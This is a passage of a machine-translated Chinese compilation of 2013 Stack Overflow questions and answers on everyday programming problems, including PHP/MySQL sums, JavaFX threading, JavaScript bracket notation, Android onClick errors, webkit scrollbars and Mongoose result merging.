`bill`包含以下字段（billId (PK)、billNo、contId、checkMtr 等...）。

在这里，每个合同都可以有多个账单。我想要做的是`add`所有的`inwMtr`合同，并从中扣除，`quantity`并将最终的 mtrs 显示为 Pending Mtr。

这是我尝试过的：

```
<?php

include("dbconnection.php");

$sql1 = mysql_query("SELECT quantity FROM contract WHERE contId = '25'");
while($result1  = mysql_fetch_array($sql1))
{
//echo "$result1[quantity]";
//echo "<br/>";

//echo "<br/>";

$sql2 = mysql_query("SELECT checkMtr FROM bill WHERE contId = '25'");
while($result2  = mysql_fetch_array($sql2))
{
//echo "$result2[checkMtr]";
//echo "<br/>";

$a = $result1['quantity'] - $result2['checkMtr'];
echo "$a";
echo "<br/>";

}
echo "<br/>";

}
echo "<br/>";
?> 
```

在这里，它确实从数量中减去 checkMtr，但它对每张账单都执行此操作。它不会添加所有账单的 checkmtrs 然后减去。

有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T23:33:35.020

```
$sql2 = mysql_query("SELECT sum(checkMtr) checkMtr FROM bill WHERE contId = '25'");
if (mysql_num_rows($sql2) == 1) {
  $result2  = mysql_fetch_array($sql2);
  $a = $result1['quantity'] - $result2['checkMtr'];
} else {
  $a = $result1['quantity'];
}
echo $a; 
```

第一次查询后也不需要`while`循环。它永远不会返回多于一行，因为您是通过主键选择行。

您也可以将其组合成一个查询：

```
SELECT quantity - ifnull(sum(checkMtr), 0) result
FROM contract c
LEFT JOIN bill USING (contId)
WHERE c.contId = '25' 
```

要对所有合同执行此操作，请使用`GROUP BY`：

```
SELECT c.contId, quantity - ifnull(sum(checkMtr), 0) result
FROM contract c
LEFT JOIN bill USING (contId)
GROUP BY c.contId 
```

[SQLFIDDLE](http://www.sqlfiddle.com/#!2/947e2/1)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T23:33:52.113

`checkMtr`在 SQL 语句和减法行中都替换为

```
SUM(checkMtr) 
```

它会起作用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T23:33:54.143

如果我理解正确，您希望 checkMtr 是一个被减去的数字？

这将添加所有 checkMtr 结果并输出该总和。

```
SELECT sum(checkMtr) FROM bill WHERE contId = '25' 
```

此外，如果 contId 是从用户提交的，我希望您正在验证数据

# java - 运行任务时JavaFx 2应用程序冻结

> ID：15845147
> 
> 赞同：-1
> 
> 时间：2013-04-05T23:19:47.310
> 
> 标签：java, multithreading, javafx-2, race-condition

我是 JavaFX 2 的新手，在 JavaFX 中使用多线程时遇到了一些麻烦。我面临的问题是应用程序只是冻结了，我找不到原因。我相信某个地方存在竞争条件，但我找不到它。正如 JavaFx 的文档所说，我创建了一个扩展“Service”的类，并使用“start()”运行它：

```
public class ProcessadorTarefas extends Service<StatusRetorno>{

    private final ITarefa tarefaPadrao=new TarefaVerificarImpressora();
    private final ITarefa tarefa;
    protected Logger logger = LoggerFactory.getLogger(this.getClass());

    public ProcessadorTarefas(ITarefa tarefa) {
        this.tarefa = tarefa;
    }

    public void processar() {
        if(getState()==State.READY)
            start();
        else
            restart();
    }

    @Override
    protected Task<StatusRetorno> createTask() {
        return new Task<StatusRetorno>() {
            @Override
            protected StatusRetorno call() throws Exception {

                    /*THE CODE FREEZES HERE*/

                StatusRetorno status = tarefaPadrao.processar();
                if (status == StatusRetorno.SUCESSO)
                    status = tarefa.processar();
                return status;
            }
        };
    }
} 
```

调用“处理器”方法的类监听 ProcessadorTarefas 类的 onSuceed、onCancelled 和 onFailed：

```
public abstract class ControladorBase implements IProcessamentoDispatcher, EventHandler<WorkerStateEvent> {

    @Autowired
    protected ControladorDialogoMensagem dialogoMensagem;
    protected ITarefa tarefa;
    protected String mensagem;
    protected Set<IProcessamentoListener> listeners = new ConcurrentSkipListSet<IProcessamentoListener>();

    protected void executarTarefa(ITarefa tarefa) {
        executarTarefa(tarefa, null);
    }

    protected void executarTarefa(ITarefa tarefa, String mensagem) {
        this.tarefa=tarefa;
        this.mensagem=mensagem;
        despacharProcessamento(StatusProcessamento.INICIADO, null);
        final ProcessadorTarefas processador=new ProcessadorTarefas(tarefa);
        processador.setOnSucceeded(this);
        processador.setOnCancelled(this);
        processador.setOnFailed(this);
        processador.processar();
    }

    @Override
    public void handle(WorkerStateEvent evento) {
        StatusRetorno status= (StatusRetorno) evento.getSource().getValue();
        despacharProcessamento(StatusProcessamento.FINALIZADO,status);
        if(status==StatusRetorno.SUCESSO)
            exibirMensagemSucesso();
        else
            exibirMensagemErro(status);
    }

    /*UNIMPORTANT CODE*/

    private void despacharProcessamento(StatusProcessamento statusProcessamento, StatusRetorno statusRetorno) {
        for (IProcessamentoListener listener : listeners)
            listener.processamento(new EventoProcessamento(this, statusProcessamento,statusRetorno));
    }

    /*ADD AND REMOVE LISTENERS CODE*/
} 
```

由于代码在“call”方法上冻结，因此不会调用侦听器并且不会显示主对话框，因为在用户登录后会调用此代码。

**添加的信息**

此代码在登录对话框关闭后和主对话框打开之前执行，因此屏幕中没有任何 javafx 元素：

```
public class App extends Application implements IDadosSubmetidosListener, IProcessamentoListener {

    /*variable declaration ommited*/   

    public static void main(String args[]) {
        launch(args);
    }

    @Override
    public void start(Stage stage) throws Exception {
        ApplicationContext contexto = new ClassPathXmlApplicationContext("/spring/appContext.xml");
        App aplicacao = contexto.getBean(App.class);
        SecurityContextHolder.setStrategyName(SecurityContextHolder.MODE_GLOBAL);
        aplicacao.iniciar();
    }

    private void iniciar() {
        cancelarOperacoesTEF();
        controladorDialogoLogin.adicionarListener(this);

        /*opens login dialog*/

        controladorDialogoLogin.abrir();
    }

    private void verificarDadosEAbrirTelaPrincipal() {

        /*after the user logged in, close login dialog*/

        controladorDialogoLogin.limparListeners();
        controladorDialogoLogin.fechar();
        if (verificadorFuncaoUsuario.usuarioAutorizado()) {
            if (verificadorFuncaoUsuario.usuarioCaixa())
                verificarSeECFValidoECadastrar();
            else
                controladorDialogoPrincipal.abrir();
        } else {
            controladorDialogoMensagem.adicionarListener(this);
            controladorDialogoMensagem.exibirAlerta("Você não tem credenciais que te permitam acessar este sistema!");
        }
    }

    private void verificarSeECFValidoECadastrar() {
        verificadorNumeroSerieECF.adicionarListener(this);

        /*this code call that class shown above*/

        verificadorNumeroSerieECF.verificarNumeroSerieECF();
    }

    private void terminarCadastroECFEAbrirTelaPrincipal() {
        controladorDialogoCadastroECF.limparListeners();
        controladorDialogoCadastroECF.fechar();
        controladorDialogoPrincipal.abrir();
    }
} 
```

如您所见，代码在主线程中调用，这是调用该代码的正确位置，还是我应该从对话框中调用它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T12:22:44.870

我不知道 Service 类仅在从 JavaFX 组件调用时才有效。因此，为了解决这个问题，我调整了这部分代码以在单个线程中运行。在程序的其他部分，该服务是从 JavaFX 的组件（例如一个按钮）启动的，并且运行良好。

# javascript - 括号 [] 与 . 访问对象属性时的语法？

> ID：15845150
> 
> 赞同：-1
> 
> 时间：2013-04-05T23:20:05.733
> 
> 标签：javascript

考虑以下代码：

```
 var friends = {
    bill: {
        firstName: "Bill",
        lastName:"William",
        number: "212-555-1212",
        address: ['Main Street', 'Yakama', 'WA','90012']
    },
    steve: {
        firstName: "Steve",
        lastName: "Steven",
        number: "818-555-1212",
        address: ['Any Street', 'Eureka', 'CA','90013']
    },
    betty: {
        firstName: "Betty",
        lastName: "Draper",
        number: "503-555-1212",
        address: ['Your Street', 'Madison', 'WI','90014']
    }
};

var search = function(name){
    for(var prop in friends){
        if(friends[prop].firstName === name){
           console.log(friends[prop]);
           return friends[prop];
        }
    }
}; 
```

我的问题专门针对这部分：

```
if(friends[prop].firstName === name) 
```

我想了解 [prop] 周围括号的用法以及为什么在这种情况下它们是必要的。我非常熟悉点语法符号，但不熟悉这些括号的使用。

关于我的问题是否重复：我之前提出的问题并提出相同的问题实际上是一个偏好问题，即使用点语法与括号表示法的优点是什么。我的问题本质上更为基本，并询问为什么要使用它，更具体地说，为什么在我展示的特定实例中需要它。此外，我没有看到其他帖子回答了我更基本的问题。

对那些嘲笑我并否决我的问题的人说一句话，称我为懒惰并且没有搜索网络或将我的头向右转：我确实在网络上搜索了答案，但有大量网页包含各种问题相关但不完全或根本不准确回答我的问题。此外，如果您不使用正确的短语或关键字搜索网络，您可能永远找不到您正在寻找的答案。我不熟悉 JS 中的这种特殊语法，所以也许我没有使用正确的短语或关键字进行搜索。

最重要的是，我认真地问了这个问题，以使自己成为一名程序员。如果我在这里唯一的失败是你们中的一些人因为试图学习或不了解这一切而觉得这是一个主要的编程罪，那不是我的问题，这里评论的某些人有小气和傲慢的问题。

也就是说，我非常感谢那些真诚地尝试回答我的问题的人，非常感谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-05T23:21:56.370

通过使用方括号，您可以定义要动态访问的属性。使用点表示法，您需要知道代码中属性的名称，而使用括号，您可以在运行时确定它。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-05T23:24:22.987

括号的内容是一个表达式，它被评估以获取属性名称。它允许您将对象用作关联数组。

在您的代码中，`friends[prop]`评估变量`prop`. 如果是`barry`，则检索`friends.barry`，如果是 ，`betty`则检索`friends.betty`，依此类推。

当您在 之后给出属性名称`.`时，它会按字面意思处理，而不是作为评估的表达式。所以`object.prop`等价于`object["prop"]`。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-05T23:23:16.993

当您使用变量来获取键或键本身是字符串时，括号语法是必需的：

```
var obj = { foo: 'foo', 'foo-bar': 'foo-bar' };

obj.foo // 'foo'
obj.foo-bar // error, invalid syntax
obj['foo-bar'] // 'foo-bar'

var key = 'foo';

obj.key // error not found
obj[key] // 'foo' 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-05T23:24:51.610

`foo.prop`将是错误的，因为`foo`没有名为 的属性`prop`。`foo[prop]`有效，因为`prop`计算为一个字符串，它是`foo`的属性的名称。

# orchardcms - Orchard 使用令牌从零件中检索属性值

> ID：15845152
> 
> 赞同：0
> 
> 时间：2013-04-05T23:20:21.690
> 
> 标签：orchardcms, token, rules

我在下面定义了一个部分，并且我有一个包含此部分的内容类型。当创建此内容类型的项目时，我正在使用规则来触发要发送的电子邮件。

我无法使用令牌访问零件上的字段。我已经在 Tokens 模块中进行了一些挖掘，它似乎无法直接访问部件上的属性，而只能访问部件上的字段。

有谁知道我如何使用令牌访问电子邮件正文中的这些属性？我尝试了 {Content.Name}、{Content.AddressChangeFormSubmission.Name} 和许多其他不同的令牌，但没有成功。我可以毫无问题地访问 {Content.Id}、{Content.ContentType} 之类的东西。

谢谢

```
public class AddressChangeFormSubmissionPart : ContentPart<AddressChangeFormSubmissionRecord>
{
    [Required]
    [Display(Name="Name")]
    public string Name
    {
        get { return Record.Name; }
        set { Record.Name = value; }
    }

    [Required, DataType(DataType.EmailAddress), EmailAttribute]
    public string Email
    {
        get { return Record.Email; }
        set { Record.Email = value; }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T05:18:33.467

令牌需要显式公开，并且没有开箱即用的主体。查看现有的代币，例如如何构建自己的代币。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T19:04:09.357

如果您在此属性“名称”上添加投影绑定（在查询的选项卡绑定中），您可能可以重试 {Content.AddressChangeFormSubmission.Name} 下一个

# paypal - 贝宝沙盒中的新测试账户获取账户受限错误

> ID：15845153
> 
> 赞同：0
> 
> 时间：2013-04-05T23:20:25.437
> 
> 标签：paypal

我刚刚搬到贝宝的新沙盒网站。由于某种原因，我无法导入任何原始测试帐户，因此我创建了一堆新帐户，我可以在沙盒测试帐户屏幕中看到这些帐户。

我已将我的应用程序迁移到新的测试帐户，并在执行链式付款时收到错误消息，说帐户受到限制。

我知道这意味着尚未设置帐户，但我很确定他们正坐在那里看着我。

下一个想法是网址更改了吗？我在新网站上找到的 Doccos 指向相同的网址，所以现在我很困惑。

这可能是一个同步的事情，需要时间来识别帐户吗？

有什么建议么？

# java - 无法从数组中引用值

> ID：15845159
> 
> 赞同：0
> 
> 时间：2013-04-05T23:21:56.397
> 
> 标签：java, arrays

我有一点问题。现在，作为化学课程的一部分，我有：

```
public static Substance Na;
public static Substance Br;

public static Substance NaBr;

public static Substance[][] combinations = {
             {NaBr, NaCl},
         {Na  , Na },
             {Br  , Cl }};
combinations[0][0] = new compound(550);

addCombination(combinations[0][0] , combinations[1][0], combinations[2][0]); 
```

这里的目标是添加使用 Na 和 Br 的组合来制造 NaBr。不幸的是，该程序似乎将“combinations[1][0]”和“combinations[2][0]”作为它们自己的变量引用，而不是它们要引用的“Na”和“Br”。如果我分别用这些值替换“Na”和“Br”，它就像一个魅力！......关于如何使数组认识到它只是引用预初始化的“Na”和“Br”的任何想法数组中的那些？

任何帮助将非常感激！先感谢您！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T23:34:20.393

从您的代码中，我只能假设您在删除后已初始化“Na”和“Br”

```
public static Substance[][] combinations = {
             {NaBr, NaCl},
             {Na  , Na },
             {Br  , Cl }}; 
```

如果您在代码顶部初始化“Na”和“Br”，您会注意到它工作正常，因为当这两个变量不是引用不存在时声明了组合。尝试这个

```
public static Substance Na = new Substance(...);
public static Substance Br = new Substance(...);

public static Substance NaBr = new Substance(...);

public static Substance[][] combinations = {
             {NaBr, NaCl},
         {Na  , Na },
             {Br  , Cl }}; 
```

它应该可以工作。

# java - 嵌套 actionPerformed()

> ID：15845174
> 
> 赞同：0
> 
> 时间：2013-04-05T23:24:20.333
> 
> 标签：java, image, swing, button, user-interface

我正在设计一个允许用户预订飞机航班的程序。程序第一次运行时，会打开一个带有两个按钮的 JFrame。根据单击的按钮，actionPerformed 会打开新的 JPanel 等。

我正在尝试在 JTabbedPane 中创建一个选项卡，该选项卡将显示两个按钮。单击任一按钮将导致不同的图像，但这部分代码已经在 actionPerformed 方法中。如何找出单击了哪个按钮？

这是我使用的方法：

```
protected JComponent makeImagePanel(String path1, String path2) 
{
    try{
        JPanel panel= new JPanel(false);
        JButton international= new JButton("International Flights");
        JButton domestic= new JButton("Domestic Flights");
        international.setActionCommand("login");
        domestic.setActionCommand("domestic");
        international.setEnabled(true);
        international.addActionListener(new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent e) {
                    BufferedImage myPicture = ImageIO.read(new File(path1));
                    JLabel picLabel = new JLabel(new ImageIcon( myPicture ));
                }
            });
        domestic.addActionListener(new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent e) {
                    BufferedImage myPicture = ImageIO.read(new File(path2));
                    JLabel picLabel = new JLabel(new ImageIcon( myPicture ));
                }
            }); 
```

这就是我尝试实现它的地方：

```
JComponent reservation= makeImagePanel("international_1.gif", "domestic_seating.gif");
            overview.addTab ("Reserve a Flight", reservation);
            overview.setMnemonicAt(1, KeyEvent.VK_2); 
```

在此先感谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T23:53:27.663

ActionEvent 有一个 getSource() 方法，它将为您提供触发事件的对象。或者您可以设置全局变量以找出单击了哪个按钮。有很多方法可以做到这一点。

问候，拉维

# android - onClick 方法问题

> ID：15845181
> 
> 赞同：2
> 
> 时间：2013-04-05T23:25:05.847
> 
> 标签：android, onclick

好的，所以我正在浏览 devoloper.android.com 网站上的“MyFirstApp”教程。我在上一个教程，我已经为你可以说的第一章做了一切。唯一的事情是，在“开始另一个活动”课程结束时，它会告诉您运行应用程序。好吧，当我运行它时，它会在模拟器上显示一个可单击的按钮，但是当您单击它时，它会出现运行时错误并强制关闭。我试图对此进行一些研究，但不知道发生了什么。错误是：***java.lang.IlleglStateException：在 android.widet.B 上的视图类上的 onClick 处理程序的活动类 com.example.MyFirstApp.MainActivity 中找不到方法 sendmessage(view)*** 我将展示代码这个：

主要活动：

```
package com.example.myfirstapp;
import android.os.Bundle;
import android.app.Activity;
import android.content.Intent;
import android.view.Menu;
import android.view.View;
import android.widget.EditText;

public class MainActivity extends Activity {
    public final static String EXTRA_MESSAGE = "com.example.myfirstapp.MESSAGE";    

    /** Called when the user clicks the Send button */
    public void sendMessage(View view) {
        Intent intent = new Intent(this, DisplayMessageActivity.class);
        EditText editText = (EditText) findViewById(R.id.edit_message);
        String message = editText.getText().toString();
        intent.putExtra(EXTRA_MESSAGE,  message);
        startActivity(intent);
        // Do something in response to button
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

} 
```

活动显示信息：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:paddingBottom="@dimen/activity_vertical_margin"
    android:paddingLeft="@dimen/activity_horizontal_margin"
    android:paddingRight="@dimen/activity_horizontal_margin"
    android:paddingTop="@dimen/activity_vertical_margin"
    tools:context=".DisplayMessageActivity" >

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="@string/hello_world" />

</RelativeLayout> 
```

DisplayMessageActivity.java:

```
package com.example.myfirstapp;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.ActionBar;
import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.support.v4.app.NavUtils;
import android.view.MenuItem;
import android.widget.TextView;

public class DisplayMessageActivity extends Activity {

    @SuppressLint("NewApi")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Get the message from the intent
        Intent intent = getIntent();
        String message = intent.getStringExtra(MainActivity.EXTRA_MESSAGE);

        // Create the text view
        TextView textView = new TextView(this);
        textView.setTextSize(40);
        textView.setText(message);

        // Set the text view as the activity layout
        setContentView(textView);

        // Make sure we're running on Fry or higher to use ActionBar APIs
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.FROYO) {
            // Show the Up button in the action bar.
            getupActionBar().setDisplayHomeAsUpEnabled(true);
        }
    }

    private ActionBar getupActionBar() {
        // TODO Auto-generated method stub
        return null;
    }

    /**
     * Set up the {@link android.app.ActionBar}, if the API is available.
     */
    @TargetApi(Build.VERSION_CODES.HONEYCOMB)
    private void setupActionBar() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB) {
            getActionBar().setDisplayHomeAsUpEnabled(true);
        }
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
        case android.R.id.home:
            // This ID represents the Home or Up button. In the case of this
            // activity, the Up button is shown. Use NavUtils to allow users
            // to navigate up one level in the application structure. For
            // more details, see the Navigation pattern on Android Design:
            //
            // http://developer.android.com/design/patterns/navigation.html#up-vs-back
            //
            NavUtils.navigateUpFromSameTask(this);
            return true;
        }
        return super.onOptionsItemSelected(item);
    }

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-05T23:33:09.840

看起来您在 xml 中拼错了函数名称`Button onClick()`。你的java代码中有一个大写的“m”

```
 public void sendMessage(View view) { 
```

并且可能是您的 xml 中的小写“m”

```
<Button
...
android:onClick="sendmessage"/> 
```

要符合 java 标准，请将其在您的 xml 中更改为

```
 android:onClick="sendMessage"/> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T02:15:58.413

我认为您以错误的方式从意图中获取信息。`EXTRA_MESSAGE`是内容，`message`是标识符。

所以你的代码`DisplayMessageActivity.java`

```
String message = intent.getStringExtra(MainActivity.EXTRA_MESSAGE); 
```

实际上应该是：

```
String message = intent.getStringExtra(message); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T05:00:38.583

您可以在您的**activity_main.xml**中看到您必须以`onClick()`这种方式声明按钮，然后它才会起作用。

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent">

    <Button
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Click" 
        android:onClick="sendMessage()"/>

</LinearLayout> 
```

# javascript - 使滚动条出现在滚动条轨道的悬停上

> ID：15845194
> 
> 赞同：4
> 
> 时间：2013-04-05T23:26:30.290
> 
> 标签：javascript, jquery, css

我通过 CSS 使用自定义滚动条样式在 webkit 中实现自定义滚动条。如果其他浏览器实现了前缀或无前缀版本/版本，请告诉我。

但是，关于我的问题。有没有办法让滚动条出现在滚动条轨道的悬停上？

有点像 Mac OS X Lion 和 Mountain Lion ？

这是我用于自定义滚动条的 CSS”

```
::-webkit-scrollbar {
    width: 12px;
}

/* Track */
::-webkit-scrollbar-track {
    -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3); 
    -webkit-border-radius: 10px;
    border-radius: 10px;
}

/* Handle */
::-webkit-scrollbar-thumb {
    -webkit-border-radius: 10px;
    border-radius: 10px;
    background: rgba(255,0,0,0.8); 
    -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.5); 
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T00:05:05.000

**编辑：此答案不再适用于当前浏览器**

`overflow-y`使用该属性并使用`body:hover`伪类显示它是一件简单的事情。我还添加了一些将在悬停时隐藏的填充，因此当滚动条显示为填充时，文本不会改变位置，当滚动条被隐藏时，填充占据了该空间。
小提琴： http: [//jsfiddle.net/J4gc9/1](http://jsfiddle.net/J4gc9/1)
CSS：

```
::-webkit-scrollbar {
    width: 12px;
}
body{
    overflow-y:hidden;
    padding-right:12px;
}
body:hover{
    overflow-y:scroll;
    padding-right:0px;
}
/* Track */
::-webkit-scrollbar-track {
    -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3); 
    -webkit-border-radius: 10px;
    border-radius: 10px;
}

/* Handle */
::-webkit-scrollbar-thumb {
    -webkit-border-radius: 10px;
    border-radius: 10px;
    background: rgba(255,0,0,0.8); 
    -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.5); 
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T00:09:46.997

这是一个 jquery 解决方案，因为您提到它，当您将鼠标悬停在它上面时需要它显示。检查这个[小提琴](http://jsfiddle.net/HnHCb/1/)

```
var bodywidth = $('body').width();
var scrollwidth = 10;
$('body').mousemove(function(e){
    var x = e.pageX - this.offsetLeft;

    if(x>bodywidth-scrollwidth)
        $('body').addClass("auto");
    else
        $('body').removeClass("auto");
});

body
{
    margin:0;
    overflow:hidden;
}
.auto
{
    overflow:auto;
} 
```

# php - 使用自动顺序编号形成邮件

> ID：15845201
> 
> 赞同：-1
> 
> 时间：2013-04-05T23:27:13.320
> 
> 标签：php

我的问题是这样

我们有一个表格，填写后会向公司发送一封包含所有表格信息的电子邮件，我的老板要求在电子邮件的信息中添加一个序列号 (1,2,3,4)

我正在使用 PHP 的 Mail 功能，它们不会将数据保存在任何数据库上，因此我无法从那里提取增量字段

有没有办法只通过代码来做到这一点？

感谢你给与我的帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T23:29:58.573

是的，例如，您可以将其保存在文件中：

```
$i = file_get_contents("number");
$i++;
file_put_contents("number", $i);
/* mail $i */ 
```

ps：但你必须将它存储在某个地方；您也可以将其存储在共享内存等中；但随后该号码将在重新启动时丢失。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T23:30:56.897

将序列号保存到数据库中（或者不太棒：将其保存到文件中）。然后每次加载表单时：

1.  从数据库（或文件）中读取数字并在电子邮件中发送
2.  增加数字
3.  将新增加的数字保存到数据库（或文件）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T23:35:06.070

您必须将信息存储在某处。一种方法是创建一个简单的 JSON 编码的“文本文件数据库”。

```
$dbFile = 'path/to/file';

// Load the data from the file
$db = @get_object_vars(json_decode(@file_get_contents($dbFile)));

...

// Update the counter
if (isset($db['mailCount'])) {
    $db['mailCount']++;
}
else {
    $db['mailCount'] = 0;
}

...

// Write the db file
$fp = fopen($dbFile, 'w+');
fwrite($fp, json_encode($db));
fclose($fp); 
```

# android - 我的游戏画布像在电脑上一样被缩小了

> ID：15845202
> 
> 赞同：1
> 
> 时间：2013-04-05T23:27:22.460
> 
> 标签：android, iphone, mobile, canvas, html5-canvas

我制作了一个用 HTML5 为手机制作的游戏。我尝试并为 Firefox OS 开发了它，它作为应用程序在 Firefox OS 上完美运行。

然后我在 Android 浏览器（Android 2.x）和运行 iOS 4 或 5（不确定是哪个）的 iPod 上尝试了它，但游戏完全像在计算机上一样被缩小了。这是我的 CSS，我使用的是 HTML5 画布标签：

```
body, html {
  margin: 0;
  padding: 0;
  width: 100%;
  height: 100%;
  overflow: hidden;
}

#canvas {
  position: absolute;
} 
```

同样在 Firefox OS 上，它不仅像在浏览器中一样作为打包应用程序运行。我在 iOS 和 Android 上都使用了默认浏览器。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:12:19.170

可能不是亲近，但你使用[视口](http://webdesignerwall.com/tutorials/viewport-meta-tag-for-non-responsive-design)吗？这是一篇非常详细的文章`viewport`，如果你`meta viewport`在 iphone 或 android（智能手机）上使用，我推荐它，把`content="width=device-width, initial-scale=1.0"`它放在非常有用的地方。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-11T20:55:43.860

它是屏幕大小的四分之一吗？可能是您没有考虑到视网膜显示？

（我知道你在 Firefox OS 下运行良好，但这是在视网膜/高分辨率屏幕设备上吗？）

如果确实如此，您可以使用 获得比例`window.devicePixelRatio`。

# javascript - 如何在我的 node.js 应用程序中正确聚合来自两种不同内容类型的 mongodb 结果？

> ID：15845203
> 
> 赞同：1
> 
> 时间：2013-04-05T23:27:28.847
> 
> 标签：javascript, node.js, mongodb, express, mongoose

如何使用来自 mongodb 的 node.js 和 mongoose 在视图中正确聚合结果。我的程序员同事想出了以下路线，将事件和博客文章聚合到一个按天排序的内容列表/视图中（如果“已发布”和“推广”都等于 1）。这样做的问题是聚合结果列表实际上只是分成两部分（首先显示事件，然后显示博客），而它们应该以按日期排序的真正混合方式呈现。我会在 mysql 中使用 join 或 groupby，但是如何在带有 mongodb 的 node.js 应用程序中进行这种类型的聚合？Ps，我们使用 express 和 mongoose 以防万一。

更新：我们已经为两者（事件和博客）定义了架构，并且已经存储了数千条记录。所以现在的问题是，我们可以做这个客户端还是我们必须创建一个索引（另一个集合）？我正在阅读 mongodb 的聚合框架和 map reduce，但我不确定这些中的任何一个是否可以帮助我。

```
 app.get('/promoted/content/:page?', userSession, function(req, res, next) {
var today = todayTimestamp();

var limit = 10;
if(req.params.page) {
    var skip = req.params.page * limit;
} else {
    var skip = 0;
}

async.parallel({
    blogs: function(callback){
        app.Blog.find()
            .where('status').equals(1)
            .where('promote').equals(1)
            .sort('sticky', -1)
            .sort('created', -1)
            .populate('userId')
            .exec(function(err, blogs) {
                if (err) {
                    console.log(err);
                } else {
                    callback(null, blogs);
                }
        });
    },
    events: function(callback){
        app.Event.find()
            .where('status').equals(1)
            .where('promote').equals(1)
            .sort('sticky', -1)
            .sort('created', -1)
            .populate('userId')
            .exec(function(err, events) {
                if (err) {
                    console.log(err);
                } else {
                    callback(null, events);
                }
        });
    }
},
// callback function to render page and pass in all data
function(err, results){

    //add type field to results for logic in mixed output
    for(i = 0; i < results.blogs.length; i++) {
        results.blogs[i].type = 'blog';
    }
    for(i = 0; i < results.events.length; i++) {
        results.events[i].type = 'event';
    }

    //combine results from blogs and events and sort the results
    var promoted = results.events.concat(results.blogs);
    var outputted = false;
    promoted.sort(function( a, b )
    {
      // Sort by key of modification date in each array
      if ( a['changed'] == b['changed'] ) return 0;
      return a['changed'] < b['changed'] ? -1 : -1;
    });

    //create a subset
    var subset = new Array();
    for(var i = skip; i < (limit + skip); i++) {
        subset.push(promoted[i]);
    }

    //check mobile
    if(isMobile(req)) {
        res.render('mobile/fragments/block_posts', { posts: subset, user: req.session.user, message: req.flash()});
    } else {
        res.render('fragments/block_posts', { posts: subset, user: req.session.user, message: req.flash()});
    }
}); 
```

# python - Python - 如何检查列表中的位置值

> ID：15845205
> 
> 赞同：-1
> 
> 时间：2013-04-05T23:27:46.423
> 
> 标签：python, arrays, list, input

## Python：列表检查

我正在尝试编写一个 Python (2.7.3) 程序来检查列表以查看是否已给出列表的放置值？

```
input = raw_input("(Enter three numbers separated by commas) >: ")
input_list = input.split(" ")
replacing_letters = [str(x.strip(" ")) for x in input_list]
'if replacing_letters[2] is blank:'
    print"Incomplete"
'elif replacing_letters[2] is full':
    print replacing_letters 
```

因此，如果我要在输入中输入三个数字，它会将列表打印给用户。但是假设我只输入两个数字。它将返回给用户“不完整”。

关于实现此目的的方法或代码的任何建议？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-05T23:28:50.163

[您可以使用内置函数获取列表](http://docs.python.org/3.3/library/functions.html#len)[的`len()`](http://docs.python.org/3.3/library/functions.html#len)长度。然后，您可以对此进行简单的检查：

```
if len(input_list) <= 2:
    ...
else:
    ... 
```

# ios - GCDAsyncSocket 客户端直到写入才读取

> ID：15845207
> 
> 赞同：1
> 
> 时间：2013-04-05T23:28:36.777
> 
> 标签：ios, objective-c, cocoa, bonjour, gcdasyncsocket

包含的代码并不多，但为什么 GCDAsyncSocket 客户端会在读取时停止，直到 writeData 排队？症状：

*   尽管服务器调用“didAcceptNewSocket”，但不会调用“didConnectToHost”。
*   服务器写入数据时不会调用“didReadData”
*   “socketDidDisconnect”没有被调用
*   来自客户端的写入正确传输

